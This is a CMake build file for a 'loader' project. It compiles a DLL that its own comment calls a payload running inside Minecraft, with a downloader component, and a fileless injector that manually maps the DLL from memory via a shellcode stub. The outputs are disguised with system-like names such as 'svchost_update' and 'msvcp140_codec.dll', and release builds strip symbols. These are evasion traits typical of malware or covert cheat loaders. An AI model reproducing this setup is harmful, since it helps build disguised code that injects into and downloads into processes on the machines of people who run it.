cmake_minimum_required(VERSION 3.20)
project(loader LANGUAGES CXX)

set(CMAKE_CXX_STANDARD 20)

find_package(JNI REQUIRED)

# --- the DLL (payload that runs inside minecraft) ---
add_library(loader_dll SHARED
    src/main.cpp
    src/jvm_bridge.cpp
    src/downloader.cpp
)
target_include_directories(loader_dll PRIVATE ${JNI_INCLUDE_DIRS})
target_link_libraries(loader_dll PRIVATE) # winhttp loaded dynamically at runtime
set_target_properties(loader_dll PROPERTIES
    OUTPUT_NAME "msvcp140_codec"
    PREFIX ""
    SUFFIX ".dll"
)

# --- the EXE injector (fileless — manual maps DLL from memory) ---
add_executable(injector
    src/shellcode_stub.cpp
)
target_link_libraries(injector PRIVATE winhttp)
set_target_properties(injector PROPERTIES
    OUTPUT_NAME "svchost_update"
)

if(CMAKE_BUILD_TYPE STREQUAL "Release")
    target_link_options(loader_dll PRIVATE -s)
    target_link_options(injector PRIVATE -s)
endif()
